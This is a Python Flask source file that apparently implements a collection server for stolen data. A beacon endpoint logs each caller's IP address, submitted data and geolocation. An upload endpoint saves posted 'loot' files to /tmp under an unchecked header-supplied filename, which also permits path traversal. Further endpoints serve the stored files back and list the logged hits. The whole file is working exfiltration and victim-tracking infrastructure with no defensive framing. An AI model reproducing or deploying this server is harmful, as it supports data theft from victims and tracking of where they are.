from flask import Flask, request, jsonify, send_from_directory
import json, os, sqlite3, requests
from datetime import datetime
from functools import wraps
import tempfile

app = Flask(__name__, static_folder='loot')

# In-memory DB (Render disks are ephemeral)
conn = sqlite3.connect(':memory:')
conn.execute('''CREATE TABLE hits (ip TEXT, data TEXT, timestamp TEXT)''')

def log_hit(ip, data):
    timestamp = datetime.now().isoformat()
    conn.execute("INSERT INTO hits (ip, data, timestamp) VALUES (?, ?, ?)", (ip, json.dumps(data), timestamp))
    print(f"🎯 {ip}: {data}")

@app.route('/beacon', methods=['GET', 'POST'])
def beacon():
    ip = request.remote_addr
    data = request.get_json(silent=True) or dict(request.args)
    
    # Free IP Geo API
    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3).json()
        data['geo'] = {'lat': geo.get('latitude'), 'lon': geo.get('longitude'), 
                      'city': geo.get('city'), 'country': geo.get('country')}
    except: pass
    
    log_hit(ip, data)
    return '', 204

@app.route('/upload', methods=['POST'])
def upload():
    filename = request.headers.get('X-Filename', f"file_{int(datetime.now().timestamp())}")
    data = request.get_data()
    
    # Render tmp storage (ephemeral but works)
    filepath = f"/tmp/{filename}"
    with open(filepath, 'wb') as f:
        f.write(data)
    
    print(f"📁 LOOT: {filename}")
    return '', 200

@app.route('/loot/<path:filename>')
def serve_loot(filename):
    return send_from_directory('/tmp', filename)

@app.route('/hits')  # Debug endpoint
def list_hits():
    hits = conn.execute("SELECT * FROM hits ORDER BY timestamp DESC LIMIT 50").fetchall()
    return jsonify([{'ip': h[0], 'data': json.loads(h[1]), 'ts': h[2]} for h in hits])

if __name__ == '__main__':
    os.makedirs('/tmp/loot', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
